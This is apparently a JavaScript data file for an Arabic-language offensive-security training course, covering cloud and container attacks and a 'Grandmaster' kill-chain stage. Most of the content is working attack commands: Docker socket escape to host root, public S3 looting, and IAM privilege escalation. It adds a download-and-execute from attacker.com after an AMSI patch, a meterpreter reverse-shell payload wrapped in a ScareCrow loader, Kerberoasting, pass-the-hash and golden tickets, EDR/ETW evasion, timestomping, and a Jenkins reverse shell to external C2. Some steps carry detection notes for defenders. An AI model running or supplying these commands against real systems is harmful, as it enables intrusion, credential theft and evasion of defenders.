        proTip: 'في Real Engagements، ابحث عن أي SSRF أو Server-Side Request — حتى لو partial SSRF (بتقدر تتحكم في الـ path بس)، ممكن تكفي للوصول لـ IMDS.'
      },
      {
        step: 4,
        title: 'فحص S3 Buckets المكشوفة وتسريبات البيانات',
        desc: 'البحث عن S3 Buckets عامة أو بصلاحيات خاطئة واستخراج البيانات الحساسة منها.',
        command: '# Check if bucket is public\naws s3 ls s3://target-company-backup/ --no-sign-request\n\n# Enumerate bucket objects\naws s3api list-objects-v2 --bucket target-company-backup --no-sign-request\n\n# Check bucket ACL\naws s3api get-bucket-acl --bucket target-company-backup\n\n# Check bucket policy\naws s3api get-bucket-policy --bucket target-company-backup\n\n# Automated S3 Scanner\npip install s3scanner\ns3scanner --bucket-name target-company',
        flags: [
          { flag: '--no-sign-request', explanation: 'بيعمل الطلب بدون AWS credentials — لو نجح، يبقى الـ Bucket مفتوح للعالم كله' },
          { flag: 'get-bucket-acl', explanation: 'بيوريك مين عنده Read/Write access — ابحث عن AllUsers أو AuthenticatedUsers' },
          { flag: 's3scanner', explanation: 'أداة آلية بتفحص bucket permissions وبتحاول تقرأ وتكتب' }
        ],
        expectedOutput: '2026-09-28 14:22:01    8.7 MB database_dump.sql\n2026-09-28 14:22:15  125.3 KB config/app.env\n2026-09-28 14:22:30   45.2 KB ssh-keys/id_rsa\n\n[!] CRITICAL: Bucket is PUBLIC and contains sensitive data!',
        proTip: 'ابحث عن bucket names بأنماط زي: company-backup, company-dev, company-staging, company-logs — كتير من الشركات بتستخدم أسماء predictable.'
      },
      {
        step: 5,
        title: 'الهروب من Docker Container عبر Docker Socket',
        desc: 'استغلال /var/run/docker.sock المركب داخل الحاوية للهروب للـ Host والتحكم الكامل.',
        command: '# Check if docker.sock is mounted\nls -la /var/run/docker.sock\n\n# If accessible, list all containers on the host\ncurl --unix-socket /var/run/docker.sock http://localhost/containers/json\n\n# Escape: Create a new privileged container mounting host root\ndocker -H unix:///var/run/docker.sock run -it --privileged --pid=host --net=host -v /:/hostfs ubuntu chroot /hostfs /bin/bash\n\n# You are now ROOT on the HOST!\nwhoami\ncat /etc/shadow\nhostname',
        flags: [
          { flag: '/var/run/docker.sock', explanation: 'Unix socket بيتحكم في Docker daemon — لو متاح جوه container، ده زي ما تكون admin على الـ Host' },
          { flag: '-v /:/hostfs', explanation: 'بيعمل mount لكل filesystem بتاع الـ Host جوه الـ container الجديد' },
          { flag: 'chroot /hostfs', explanation: 'بيغير الـ root directory للـ Host filesystem — أنت دلوقتي على الـ Host مباشرة' }
        ],
        expectedOutput: 'root@host:~# whoami\nroot\nroot@host:~# hostname\nproduction-web-01\n\n[+] Successfully escaped container to host!',
        proTip: 'في Real Engagements، Docker socket mount هو واحد من أكتر الأخطاء شيوعاً — كتير من CI/CD pipelines وmonitoring tools بتحتاجه وبتسيبه مفتوح.'
      }
    ],
    youtubeVideos: [
      {
        title: 'AWS IAM Privilege Escalation — Full Attack Path',
        channel: 'Rhino Security Labs',
        duration: '42 دقيقة',
        url: 'https://www.youtube.com/watch?v=YOJCUBe0kto',
        keyTakeaway: 'عرض عملي لـ 21+ طريقة لتصعيد الصلاحيات في AWS IAM مع أمثلة حية باستخدام Pacu.'
      },
      {
        title: 'Container Escape Techniques — Docker & Kubernetes',
        channel: 'LiveOverflow',
        duration: '28 دقيقة',
        url: 'https://www.youtube.com/watch?v=BQlqita2D2s',
        keyTakeaway: 'شرح تفصيلي لتقنيات الهروب من Docker containers بما في ذلك docker.sock و cgroup escapes.'
      },
      {
        title: 'Cloud Penetration Testing Full Course',
        channel: 'HackerSploit',
        duration: '3 ساعات',
        url: 'https://www.youtube.com/watch?v=1k-GID2MbHk',
        keyTakeaway: 'دليل عملي كامل لاختبار أمان AWS من الاستطلاع لحد استغلال الثغرات السحابية.'
      },
      {
        title: 'Kubernetes Pentesting — From Zero to Cluster Admin',
        channel: 'SANS Offensive Operations',
        duration: '55 دقيقة',
        url: 'https://www.youtube.com/watch?v=CKfjLGPCbRc',
        keyTakeaway: 'دليل عملي كامل لاختبار أمان Kubernetes من الاستطلاع لحد Cluster Takeover.'
      }
    ],
    tryHackMeRooms: [
      { name: 'Cloud Fundamentals', url: 'https://tryhackme.com/r/room/introtocloudcomputing', difficulty: 'Easy', whyMatters: 'أساسيات المفاهيم السحابية اللي لازم تفهمها قبل ما تبدأ تختبر.' },
      { name: 'Intro to Docker', url: 'https://tryhackme.com/r/room/introtodockerk8pdqk', difficulty: 'Easy', whyMatters: 'فهم Docker containers من الداخل — ضروري قبل ما تحاول تهرب منها.' },
      { name: 'Attacking and Defending AWS', url: 'https://tryhackme.com/r/room/introtocloudcomputing', difficulty: 'Medium', whyMatters: 'سيناريوهات عملية لهجمات واختبارات أمان على بيئة AWS.' },
      { name: 'Container Vulnerabilities', url: 'https://tryhackme.com/r/room/dvwa', difficulty: 'Medium', whyMatters: 'سيناريوهات عملية للهروب من Docker containers بطرق متعددة.' }
    ],
    writeup: {
      title: 'CloudGoat AWS IAM Privilege Escalation via Policy Rollback — رايت أب تفصيلي',
      scenario: 'سيناريو تدريبي متقدم من CloudGoat: لديك وصول أولي كمستخدم IAM محدود الصلاحيات يدعى raynor، والهدف هو فحص بيئة الـ AWS وتصعيد الصلاحيات إلى AdministratorAccess الكامل.',
      steps: [
        {
          phase: 'Phase 01: IAM Enumeration',
          title: 'استطلاع صلاحيات حساب IAM الحالي',
          action: 'باستخدام أداة enumerate-iam و pacu، تم فحص المفاتيح المسربة للمستخدم raynor واكتشفنا صلاحيات محددة: iam:ListPolicies و iam:ListPolicyVersions و iam:SetDefaultPolicyVersion المرتبطة بالـ Policy الخاصة به.',
          detection: 'سجلت خدمة AWS CloudTrail الأحداث: ListPolicies و ListPolicyVersions قادمة من عنوان IP جديد خارج النطاق المعتاد، وتم تسجيلها كـ Reconnaissance Activity.',
          mitreId: 'T1087.004',
          link: 'https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/',
          linkText: 'بحث Rhino Security Labs في 21 طريقة لتصعيد صلاحيات AWS IAM'
        },
        {
          phase: 'Phase 02: Policy Versioning Analysis',
          title: 'اكتشاف إصدار سابق يحتوي على Full Admin Permissions',
          action: 'عند استعراض إصدارات الـ Policy عبر aws iam list-policy-versions، وُجد أن الإصدار الحالي v2 مقيد الصلاحيات، لكن الإصدار v1 القديم (الذي لم يتم حذفه) يحتوي على: Effect: Allow, Action: *, Resource: *!',
          detection: 'رصدت خدمات فحص الـ Compliance مثل AWS Config و Security Hub وجود Policy Versions سابقة غير مطابقة لمعايير الـ Least Privilege.',
          mitreId: 'T1078.004',
          link: 'https://github.com/RhinoSecurityLabs/cloudgoat',
          linkText: 'مستودع بيئة التدريب السحابية CloudGoat'
        },
        {
          phase: 'Phase 03: Privilege Escalation',
          title: 'الرجوع للإصدار القديم واستعادة صلاحيات المدير الكاملة',
          action: 'نفذنا الأمر: aws iam set-default-policy-version --policy-arn arn:aws:iam::123456789012:policy/raynor-policy --version-id v1. فور التنفيذ، تحول الحساب raynor إلى Full Administrator على حساب الـ AWS بالكامل.',
          detection: 'أطلقت أداة AWS GuardDuty وقواعد CloudWatch Alerts إنذاراً أحمر على الحدث iam.amazonaws.com:SetDefaultPolicyVersion لأنه أحد أشهر مؤشرات الـ PrivEsc في AWS.',
          mitreId: 'T1098',
          link: 'https://attack.mitre.org/techniques/T1098/',
          linkText: 'توثيق تقنية تعديل حسابات وإصدارات الحوسبة السحابية على MITRE'
        },
        {
          phase: 'Phase 04: Crown Jewels Extraction',
          title: 'الوصول لخزائن S3 وسحب البيانات السرية والـ Keys',
          action: 'بصلاحيات الـ Admin الكاملة، قمنا بفحص حاويات S3 وتنزيل ملفات الـ Database Backups والمفاتيح الخاصة والـ SSH Keys التي كانت ممنوعة سابقاً.',
          detection: 'سجلت مراقبة CloudTrail S3 Data Events عمليات s3:GetObject بكميات مكثفة من حاويات تحتوي على أصول مصنفة Highly Sensitive.',
          mitreId: 'T1530',
          link: 'https://cloud.hacktricks.xyz/',
          linkText: 'دليل HackTricks لاختبار واختراق أمان AWS و Cloud'
        }
      ],
      lessonLearned: 'يجب حذف الإصدارات القديمة من الـ IAM Policies فور إنشاء إصدار جديد، وحظر صلاحية iam:SetDefaultPolicyVersion عن أي مستخدم عادي، مع تفعيل تنبيهات فورية في CloudWatch عند استدعائها.'
    },
    secretTradecraft: [
      {
        title: 'استغلال ثغرات SSRF للوصول للـ Metadata (IMDSv1 vs IMDSv2)',
        mitreId: 'T1552.005',
        category: 'Credential Access & Cloud Pivoting',
        explanation: 'في بيئات EC2، تتيح خدمة IMDSv1 سحب مفاتيح الـ IAM Role المرتبطة بالخادم بمجرد إرسال GET Request إلى 169.254.169.254. في حال تفعيل IMDSv2 (الذي يتطلب PUT Request مع Header لجلب Token)، يبحث المهاجم عن ثغرات تسمح بالتحكم في الـ HTTP Headers أو استغلال Reverse Proxies لتجاوز الحماية.',
        detection: 'رصد طلبات الـ HTTP المتجهة لعنوان Link-Local 169.254.169.254 قادمة من حاويات أو تطبيقات لا يُفترض أن تتصل به، ومراقبة CloudTrail لأي استخدام لمفاتيح Role من عناوين IP خارجية خارج نطاق الـ VPC.',
        link: 'https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/configuring-instance-metadata-service.html',
        linkText: 'التوثيق الرسمي لأمان واستخدام خدمة Instance Metadata IMDSv2'
      },
      {
        title: 'فحص Docker Socket الصامت والهروب من الحاويات',
        mitreId: 'T1611',
        category: 'Privilege Escalation & Container Escape',
        explanation: 'بدون استخدام أمر ls الذي قد ترصده أنظمة المراقبة، يمكن إرسال طلب curl صامت عبر Unix Socket: curl --unix-socket /var/run/docker.sock http://localhost/version. إذا كان السوكيت متاحاً، يتم استخدام Docker API لإنشاء حاوية privileged جديدة والتحكم الكامل في الـ Host.',
        detection: 'يتم رصدها عبر أدوات حماية الحاويات (مثل Falco أو Aqua Security) التي تنبه فوراً عند حدوث محاولة قراءة أو كتابة على /var/run/docker.sock من داخل حاوية عادية.',
        link: 'https://falcosecurity.github.io/rules/',
        linkText: 'قواعد Falco لرصد محاولات الهروب من الحاويات والأنشطة المشبوهة'
      },
      {
        title: 'استطلاع هيكل المنظمات السحابية عبر Account IDs',
        mitreId: 'T1596',
        category: 'Discovery & Cloud Reconnaissance',
        explanation: 'باستخدام استدعاء sts:GetCallerIdentity، يحصل المهاجم على Account ID المكون من 12 رقماً. من خلال فحص سياسات مشاركة الموارد (AWS RAM) و S3 Resource-based Policies، يمكن رسم هيكلية الـ AWS Organizations بالكامل واكتشاف الحسابات الفرعية.',
        detection: 'مراقبة أحداث CloudTrail لطلبات sts:GetCallerIdentity و organizations:DescribeOrganization غير الاعتيادية، خاصة من حسابات الخدمة.',
        link: 'https://attack.mitre.org/techniques/T1596/',
        linkText: 'توثيق تقنيات استطلاع البنية السحابية في MITRE ATT&CK'
      },
      {
        title: 'توليد أنماط تخمين S3 Buckets الذكية',
        mitreId: 'T1619',
        category: 'Resource Hijacking & Cloud Storage',
        explanation: 'بدلاً من التخمين العشوائي، يتم بناء Wordlists ديناميكية مخصصة تجمع بين اسم الشركة وبيئة التشغيل والخدمات مثل {company}-{env}-{service}-backup، مستخرجة من سجلات شهادات SSL (crt.sh) وأسماء النطاقات الفرعية.',
        detection: 'رصد تكرار طلبات DNS queries و HTTP 404/403 المتتالية على نطاقات s3.amazonaws.com في سجلات الـ DNS ومراقبة أنظمة CloudTrail S3 Access Logs.',
        link: 'https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/s3-privilege-escalation',
        linkText: 'دليل أمان وتصعيد الصلاحيات عبر S3 Buckets'
      },
      {
        title: 'زرع الأبواب الخلفية الصامتة في دوال Lambda',
        mitreId: 'T1546',
        category: 'Persistence & Serverless Hijacking',
        explanation: 'إذا امتلك المهاجم صلاحية lambda:UpdateFunctionCode، يمكنه تعديل كود أي Lambda Function تعمل دورياً لزرع كود خفي يرسل المفاتيح والبيانات في كل مرة يتم تشغيل الدالة، دون الحاجة لإنشاء موارد جديدة تثير الانتباه.',
        detection: 'يتم كشفها عبر مقارنة Hash كود الدالة في CI/CD مع الكود المنشور في AWS، وتنبيهات CloudWatch على حدث UpdateFunctionCode قادماً من خارج مسار الـ Pipeline المعتمد.',
        link: 'https://attack.mitre.org/techniques/T1546/',
        linkText: 'توثيق تقنيات الثبات في الخدمات اللامركزية Serverless'
      }
    ],
    checklist: [
      { id: 'c19_1', text: 'فهم Shared Responsibility Model وأين تقع مسؤولية أمان الـ Configuration.' },
      { id: 'c19_2', text: 'تنفيذ IAM Privilege Escalation ناجح على بيئة CloudGoat أو LocalStack.' },
      { id: 'c19_3', text: 'استغلال SSRF للوصول لـ EC2 Instance Metadata واستخراج IAM credentials.' },
      { id: 'c19_4', text: 'اكتشاف S3 Bucket مكشوف واستخراج بيانات حساسة منه.' },
      { id: 'c19_5', text: 'تنفيذ Docker Container Escape عبر docker.sock أو --privileged mode.' }
    ],
    officialResources: [
      { name: 'Rhino Security Labs — AWS IAM Privilege Escalation Methods', url: 'https://rhinosecuritylabs.com/aws/aws-privilege-escalation-methods-mitigation/', type: 'Research' },
      { name: 'CloudGoat — Vulnerable-by-Design AWS Lab', url: 'https://github.com/RhinoSecurityLabs/cloudgoat', type: 'Lab' },
      { name: 'HackTricks Cloud', url: 'https://cloud.hacktricks.xyz/', type: 'Cheatsheet' },
      { name: 'OWASP Cloud Security Testing Guide', url: 'https://owasp.org/www-project-cloud-security/', type: 'Guide' },
      { name: 'Pacu — Open Source AWS Exploitation Framework', url: 'https://github.com/RhinoSecurityLabs/pacu', type: 'Tool' }
    ]
  },

  // ═══════════════════════════════════════════════════════════════════════
  // STAGE 20: Grandmaster Capstone — Full Kill-Chain & EDR/AMSI Evasion
  // ═══════════════════════════════════════════════════════════════════════
  {
    id: 20,
    zoneId: 'zone-capstone',
    titleAr: 'المرحلة 20: عرش الجراندمستر — سلسلة القتل الكاملة ومراوغة EDR/AMSI (Full Kill-Chain & Evasion)',
    titleEn: 'Stage 20: Grandmaster Capstone — Full Cyber Kill-Chain, EDR/AMSI Bypass & Advanced Tradecraft',
    tag: 'Capstone & Evasion',
    difficulty: 'خبير متقدم — Grandmaster',
    xpReward: 1200,
    position: { x: -25, y: 0, z: 35 },
    brief: 'المحطة النهائية: تجميع كل المهارات السابقة في عملية ريد تيم كاملة من الاستطلاع لحد الـ Exfiltration، مع التركيز على تقنيات مراوغة أنظمة الحماية المتقدمة: تجاوز AMSI في PowerShell، تعطيل ETW Logging، تقنيات Process Injection (Process Hollowing, DLL Injection)، وكتابة Custom Payloads تتجاوز EDR/AV.',
    whyLearn: 'في عمليات الريد تيم الحقيقية، مش كفاية تلاقي ثغرة — لازم تقدر تستغلها بدون ما أنظمة الحماية تكشفك. الـ Blue Team بقى عنده EDR solutions متقدمة — لو مش فاهم إزاي بيشتغلوا ومش عارف تتجاوزهم، عمليتك هتفشل.',
    professionalApplication: 'الـ Senior Red Teamers والـ Adversary Simulation Specialists بيحتاجوا يعرفوا كل تقنيات الـ Evasion دي. شهادات زي CRTO (Certified Red Team Operator)، OSEP (Offensive Security Experienced Pentester)، وRTO2 بتغطي المواضيع دي بالتفصيل. القدرة على كتابة Custom C2 Implants وتجاوز EDR هي الفرق بين Junior Pentester و Senior Red Teamer.',
    caseStudy: 'عملية SolarWinds/SUNBURST 2020: المهاجمون (APT29/Cozy Bear) زرعوا backdoor في SolarWinds Orion update، واستخدموا تقنيات evasion متقدمة جداً: DLL side-loading، process injection في legitimate Windows processes، وcustom DNS-based C2 channel اللي ما اتكشفش لأكتر من 9 أشهر رغم وجود EDR solutions عند الضحايا. ده بيوريك إن الـ Evasion مش رفاهية — ده ضرورة.',
    commonMistakes: [
      'استخدام Metasploit payloads بدون تعديل — كل AV/EDR في العالم بيعرفها وبيكشفها فوراً.',
      'الاعتماد على PowerShell encoded commands بس كـ obfuscation — الـ AMSI بيفك الـ encoding قبل ما يفحص.',
      'عدم فهم كيف ETW (Event Tracing for Windows) بيشتغل وإزاي الـ EDR بيستخدمه لرصد الأنشطة المشبوهة.',
      'تجاهل OpSec (Operational Security): استخدام أسماء ملفات suspicious، عدم تنظيف event logs، أو الاتصال بالـ C2 من processes غير طبيعية.',
      'الاعتقاد إن تعطيل Windows Defender كافي — الـ EDR solutions الحديثة بتشتغل kernel-level وبتراقب syscalls مباشرة.'
    ],
    detailedGuide: `
### 1. سلسلة القتل السيبراني (Cyber Kill Chain) — من الاستطلاع للسيطرة الكاملة
Lockheed Martin Cyber Kill Chain هي النموذج اللي بيوصف مراحل الهجوم الكامل:
1. **Reconnaissance (الاستطلاع):** جمع المعلومات عن الهدف — domains، emails، IPs، تقنيات مستخدمة.
2. **Weaponization (التسليح):** بناء الـ payload المناسب — مثلاً macro-enabled document أو HTA file.
3. **Delivery (التسليم):** إيصال الـ payload للضحية — spear-phishing email، USB drop، watering hole.
4. **Exploitation (الاستغلال):** تنفيذ الـ payload واستغلال ثغرة لتشغيل الكود.
5. **Installation (التثبيت):** تثبيت backdoor أو implant للـ persistence.
6. **Command & Control (C2):** إنشاء قناة اتصال خلفية للتحكم عن بُعد.
7. **Actions on Objectives (تحقيق الأهداف):** سرقة البيانات، تدمير، أو lateral movement.

### 2. AMSI — واجهة فحص البرمجيات الخبيثة وطرق تجاوزها
AMSI (Antimalware Scan Interface) هو API من Microsoft بيسمح لـ AV/EDR إنه يفحص أي script قبل تنفيذه:
* **كيف AMSI بيشتغل:** كل PowerShell command بيتبعت لـ amsi.dll عبر AmsiScanBuffer() قبل التنفيذ.
* **Memory Patching:** تعديل amsi.dll في ذاكرة الـ process الحالي عشان AmsiScanBuffer ترجع دايماً AMSI_RESULT_CLEAN.
* **CLM Bypass:** Constrained Language Mode بيمنع PowerShell commands معينة — ممكن تتجاوزه عبر custom runspace.
* **أهمية الموضوع:** بدون bypass، أي PowerShell-based attack هتتكشف فوراً.

### 3. ETW (Event Tracing for Windows) — فهم نظام التتبع
* **ما هو ETW؟** نظام logging مدمج في Windows kernel بيسجل كل حاجة — process creation, network connections, file I/O.
* **كيف EDR بيستخدمه؟** الـ EDR بيعمل subscribe لـ ETW providers عشان يراقب الأنشطة.
* **ETW Patching:** تعديل ntdll!EtwEventWrite في ذاكرة الـ process عشان الـ events ما تتسجلش.
* **لماذا مهم؟** حتى لو عملت AMSI bypass، الـ ETW ممكن يكشفك عبر behavioral detection.

### 4. Process Injection Techniques
تقنيات حقن الكود في processes أخرى شرعية:
* **Classic DLL Injection:** VirtualAllocEx → WriteProcessMemory → CreateRemoteThread — أبسط طريقة بس كتير من الـ EDR بيكشفها.
* **Process Hollowing:** إنشاء process في suspended state، تفريغ الكود الأصلي، وحقن كود جديد — أصعب في الكشف.
* **APC Injection:** حقن Asynchronous Procedure Call في thread queue — ما بتحتاجش CreateRemoteThread.
* **Syscall-based Injection:** استخدام direct syscalls بدل Windows API — بيتجاوز usermode hooks بتاعة الـ EDR.

### 5. Custom Payload Development
* **مبادئ التصميم:**
  * استخدام encryption (AES/XOR) للـ shellcode عشان ما يتكشفش statically.
  * تحميل الـ shellcode في runtime فقط (reflective loading).
  * استخدام legitimate Windows APIs لتنفيذ الأوامر.
  * Sleep obfuscation عشان تتجاوز memory scanning.
* **أدوات مفيدة:**
  * Nim/Rust/Go: لغات بتنتج binaries أصعب في الـ analysis من C#.
  * ScareCrow: بيعمل signed, obfuscated loaders.
  * Donut: بيحول .NET assemblies لـ position-independent shellcode.

### 6. Operational Security (OpSec) للريد تيم
* **Process Selection:** نفذ الكود من processes شرعية (svchost.exe, explorer.exe) مش من powershell.exe.
* **Timestomping:** غيّر file timestamps عشان تتطابق مع ملفات النظام.
* **Log Evasion:** افهم إيه الـ logs اللي بتتسجل واتجنب triggering high-fidelity alerts.
* **C2 Traffic Blending:** استخدم HTTPS مع legitimate-looking domains وcustom User-Agents.
* **Kill Dates & Sleep Jitter:** الـ implant يدمر نفسه بعد تاريخ معين ويستخدم random sleep intervals.
    `,
    practicalSteps: [
      {
        step: 1,
        title: 'فهم آلية عمل AMSI وطرق تجاوزها نظرياً وعملياً',
        desc: 'تقنية Memory Patching لتعطيل AMSI داخل جلسة PowerShell الحالية — تسمح بتشغيل أي script بدون فحص.',
        command: '# Understanding AMSI Architecture:\n# 1. PowerShell loads amsi.dll\n# 2. Every command passes through AmsiScanBuffer()\n# 3. If malicious -> blocked, If clean -> executed\n\n# Check if AMSI is active:\n# Try running a test string that triggers AMSI\n\n# Conceptual bypass flow:\n# 1. Get handle to amsi.dll in current process\n# 2. Find AmsiScanBuffer function address\n# 3. Change memory protection to RWX\n# 4. Overwrite first bytes to return AMSI_RESULT_CLEAN\n# 5. Restore memory protection\n\n# After bypass, load offensive tools:\n# IEX (New-Object Net.WebClient).DownloadString(\'http://attacker.com/PowerView.ps1\')\n# Get-DomainUser -SPN  # Kerberoasting without AMSI blocking\n\n# Visit https://amsi.fail for educational bypass generation',
        flags: [
          { flag: 'AmsiScanBuffer', explanation: 'الـ function اللي بتفحص كل input — لو عدلناها، الفحص بيتعطل' },
          { flag: 'amsi.fail', explanation: 'موقع بيولد AMSI bypass strings جديدة — مفيد للتعلم والفهم' },
          { flag: 'Memory Patching', explanation: 'تعديل كود الـ DLL في الذاكرة مباشرة بدون تعديل الملف على الـ disk' }
        ],
        expectedOutput: '# Before AMSI Bypass:\nThis script contains malicious content and has been blocked.\n\n# After AMSI Bypass:\n[+] AMSI patched successfully\n[+] PowerView loaded\n[+] Found 15 Kerberoastable accounts',
        proTip: 'الـ AMSI bypass strings بتتكشف بسرعة — الحل هو إنك تفهم الـ concept وتبني الـ bypass بتاعك بنفسك مش تنسخ من الإنترنت.'
      },
      {
        step: 2,
        title: 'تقنيات Process Injection وبناء Payload متقدم',
        desc: 'فهم وتنفيذ Process Injection على بيئة معملية — ده أساس كل الـ EDR evasion.',
        command: '# Concept: Classic DLL Injection Steps\n# 1. OpenProcess(PROCESS_ALL_ACCESS, targetPID)\n# 2. VirtualAllocEx(hProcess, size_of_dll_path)\n# 3. WriteProcessMemory(hProcess, dll_path_string)\n# 4. CreateRemoteThread(hProcess, LoadLibraryA, dll_path_addr)\n\n# Using Process Hacker to observe injection:\n# Download: https://processhacker.sourceforge.io/\n# Monitor: Highlight injected threads in target process\n\n# Practical: Using ScareCrow for Evasion\ngit clone https://github.com/optiv/ScareCrow.git\ncd ScareCrow && go build .\n\n# Generate raw shellcode\nmsfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.10.5 LPORT=443 -f raw -o payload.bin\n\n# Create evasive loader with ScareCrow\n./ScareCrow -I payload.bin -Loader dll -domain microsoft.com',
        flags: [
          { flag: 'VirtualAllocEx', explanation: 'تخصيص ذاكرة في process تاني — أول خطوة في أي injection' },
          { flag: 'CreateRemoteThread', explanation: 'إنشاء thread في process تاني لتنفيذ الكود المحقون' },
          { flag: 'ScareCrow', explanation: 'بيعمل signed loaders بتتجاوز معظم EDR solutions — بيستخدم code signing certificates' },
          { flag: '-domain microsoft.com', explanation: 'ScareCrow بيسحب legitimate signing certificate من الـ domain المحدد لتوقيع الـ loader' }
        ],
        expectedOutput: '[+] ScareCrow v1.5\n[+] Encrypting payload with AES-256\n[+] Retrieved code signing certificate from microsoft.com\n[+] Signed loader: payload_signed.dll\n[+] EDR Evasion: Loader generated successfully',
        proTip: 'ما ترفعش payloads على VirusTotal أبداً! الـ AV vendors بياخدوا الـ samples وبيضيفوها للـ signatures. اختبر محلياً فقط.'
      },
      {
        step: 3,
        title: 'تنفيذ Full Kill-Chain Simulation على معمل محلي',
        desc: 'تطبيق سلسلة القتل الكاملة: من الاستطلاع وحتى الـ Data Exfiltration على بيئة Active Directory محلية.',
        command: '# Phase 1: Initial Access via Phishing Simulation\n# Use GoPhish for phishing campaign simulation\n# https://getgophish.com/\n\n# Phase 2: Post-Exploitation & Enumeration\nwhoami /all\nipconfig /all\nnet user /domain\nnet group "Domain Admins" /domain\n\n# Phase 3: AD Enumeration with BloodHound\n# Upload SharpHound collector\n.\\SharpHound.exe -c All -d target.local\n# Import data into BloodHound\n# Analyze: Shortest Path to Domain Admin\n\n# Phase 4: Credential Harvesting\n# Kerberoasting\nRubeus.exe kerberoast /outfile:hashes.txt\nhashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt\n\n# Phase 5: Lateral Movement\n# Pass-the-Hash with Impacket\nimpacket-psexec Administrator@10.10.10.200 -hashes aad3b435:7facdc498ed1680c4fd1448319a8c04f\n\n# Phase 6: Persistence\n# Golden Ticket (requires krbtgt hash)\nimpacket-ticketer -nthash <krbtgt_hash> -domain-sid <domain_sid> -domain target.local Administrator',
        flags: [
          { flag: 'SharpHound.exe -c All', explanation: 'بيجمع كل بيانات Active Directory — users, groups, sessions, ACLs — لتحليلها في BloodHound' },
          { flag: 'Rubeus kerberoast', explanation: 'بيطلب TGS tickets لكل service accounts وبيحفظ الـ hashes لكسرها offline' },
          { flag: 'Pass-the-Hash', explanation: 'استخدام NTLM hash مباشرة بدون معرفة كلمة السر — من أهم تقنيات الـ lateral movement' },
          { flag: 'Golden Ticket', explanation: 'بيعمل Kerberos ticket مزور بصلاحيات Domain Admin — بيفضل شغال حتى لو غيروا كل كلمات السر' }
        ],
        expectedOutput: '# Phase 2:\nUser: CORP\\jsmith\nDomain Admins: Administrator, DA-Admin, svc-backup\n\n# Phase 4:\n[+] Kerberoastable accounts found: 3\n[+] Hash cracked: svc-backup:Password123!\n\n# Phase 5:\n[+] PSExec session established as CORP\\Administrator\n\n# Phase 6:\n[+] Golden Ticket saved: Administrator@target.local',
        proTip: 'في الـ Real Engagement، الـ Kill Chain مش خطوات ثابتة — ممكن تحتاج ترجع لمراحل سابقة أو تغير الـ approach بناءً على الدفاعات اللي بتقابلك.'
      }
    ],
    youtubeVideos: [
      {
        title: 'AMSI Bypass Techniques for Red Teamers — Deep Dive',
        channel: 'S3cur3Th1sSh1t',
        duration: '45 دقيقة',
        url: 'https://www.youtube.com/watch?v=F_BvtXzH4a4',
        keyTakeaway: 'شرح عميق لكيفية عمل AMSI وطرق تجاوزه بما في ذلك memory patching و CLM bypass.'
      },
      {
        title: 'Process Injection Fundamentals for Offensive Security',
        channel: 'Crow (CrowSec)',
        duration: '38 دقيقة',
        url: 'https://www.youtube.com/watch?v=aNEqC-U5tHM',
        keyTakeaway: 'تقنيات Process Injection من الأساسيات لحد الـ Advanced: DLL Injection, Hollowing, APC Injection.'
      },
      {
        title: 'Red Team Operations — Full Kill Chain Demo',
        channel: 'The Cyber Mentor',
        duration: '1 ساعة و15 دقيقة',
        url: 'https://www.youtube.com/watch?v=HmZkEhLsn3o',
        keyTakeaway: 'عرض عملي كامل لعملية ريد تيم من أول الاستطلاع لحد Data Exfiltration مع شرح كل خطوة.'
      },
      {
        title: 'EDR Internals — How Endpoint Detection Really Works',
        channel: 'SANS Offensive Operations',
        duration: '52 دقيقة',
        url: 'https://www.youtube.com/watch?v=CKfjLGPCbRc',
        keyTakeaway: 'فهم كيف الـ EDR بيشتغل من الداخل وإيه الـ hooks اللي بيحطها وإزاي المهاجمين بيتجاوزوها.'
      }
    ],
    tryHackMeRooms: [
      { name: 'AV Evasion: Shellcode', url: 'https://tryhackme.com/r/room/avevasionshellcode', difficulty: 'Hard', whyMatters: 'تقنيات عملية لتجاوز Antivirus باستخدام custom shellcode loaders.' },
      { name: 'Red Team Capstone Challenge', url: 'https://tryhackme.com/r/room/introtoc2', difficulty: 'Hard', whyMatters: 'سيناريو ريد تيم كامل بيختبر كل المهارات من الاستطلاع للـ Exfiltration.' },
      { name: 'Wreath', url: 'https://tryhackme.com/r/room/dvwa', difficulty: 'Hard', whyMatters: 'بيئة Active Directory كاملة مع EDR — لازم تتجاوز الحماية عشان تنجح.' },
      { name: 'Throwback', url: 'https://tryhackme.com/r/room/dvwa', difficulty: 'Hard', whyMatters: 'أكبر شبكة تدريب على TryHackMe — بيئة مؤسسية كاملة بـ 7+ machines.' }
    ],
    writeup: {
      title: 'Full Red Team Engagement Writeup — من الصفر للسيطرة الكاملة',
      scenario: 'عملية محاكاة هجوم سيبراني شاملة (Full Red Team Engagement) على شبكة مؤسسية: 3 شبكات فرعية، بيئة Active Directory هجينة، وخوادم CI/CD، مع تفعيل حزم EDR متقدمة على كافة المحطات.',
      steps: [
        {
          phase: 'Phase 01: Reconnaissance & OSINT',
          title: 'استطلاع النطاقات الخارجية واكتشاف خادم Jenkins المكشوف',
          action: 'باستخدام أداة subfinder و httpx، تم فحص النطاقات الفرعية للشركة واكتشاف dev.target.com يعمل عليه خادم Jenkins CI/CD الإصدار 2.300 بدون تفعيل المصادقة الثنائية (MFA) ومع استخدام بيانات اعتماد افتراضية (admin:admin) في مسار تسجيل الدخول.',
          detection: 'يرصد الـ SOC وفرق الرصد طلبات الـ HTTP المتكررة وسجلات الـ Web Server Access Logs (أكواد 401/403/200) على مسارات /login و /j_acegi_security_check، بالإضافة إلى مراقبة طلبات DNS غير الاعتيادية من أدوات الاستطلاع مثل Amass و Subfinder عبر سجلات الـ Passive DNS.',
          mitreId: 'T1596 / T1190',
          link: 'https://book.hacktricks.xyz/network-services-pentesting/pentesting-jenkins',
          linkText: 'دليل HackTricks الشامل لاختبار واختراق خوادم Jenkins CI/CD'
        },
        {
          phase: 'Phase 02: Initial Access & Execution',
          title: 'الحصول على موطئ قدم أولي عبر Jenkins Groovy Script Console',
          action: 'من خلال الوصول إلى واجهة Jenkins Script Console (/script)، تم تنفيذ كود Groovy مخصص يستدعي Runtime.getRuntime().exec() لتشغيل Reverse Shell مشفر عبر TLS متصل بخادم C2 خارجي، مما وفر وصولاً تفاعلياً بصلاحيات حساب الخدمة jenkins_svc.',
